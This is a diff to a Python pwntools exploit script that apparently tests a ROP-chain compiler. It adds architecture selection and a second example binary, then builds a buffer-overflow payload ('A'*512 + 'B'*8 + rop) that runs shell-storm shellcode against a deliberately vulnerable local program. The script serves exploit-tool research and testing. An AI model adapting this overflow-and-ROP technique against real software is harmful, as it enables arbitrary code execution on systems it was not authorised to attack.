@@ -1,8 +1,11 @@
 import sys, logging, binascii
+import archinfo
 from pwn import *
 from rop_compiler import ropme, goal
 
-filename = './example/bof_read_got'
+filename, arch = './example/bof_read_got', archinfo.ArchAMD64()
+if len(sys.argv) > 1:
+  filename, arch = './example/bof_read_got2', archinfo.ArchAMD64()
 p = process([filename,'3000'])
 #gdb.attach(p, "set disassembly-flavor intel\nbreak *mprotect\nbreak *0x400677")
 
@@ -22,7 +25,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
 
 files = [(filename, None, 0)]
 libs = ["/lib/x86_64-linux-gnu/libc.so.6"]
-rop = ropme.rop(files, libs, [["shellcode_hex", binascii.hexlify(shellcode)]], log_level = logging.DEBUG)
+rop = ropme.rop(files, libs, [["shellcode_hex", binascii.hexlify(shellcode)]], arch = arch, log_level = logging.DEBUG)
 
 payload = 'A'*512 + 'B'*8 + rop
 
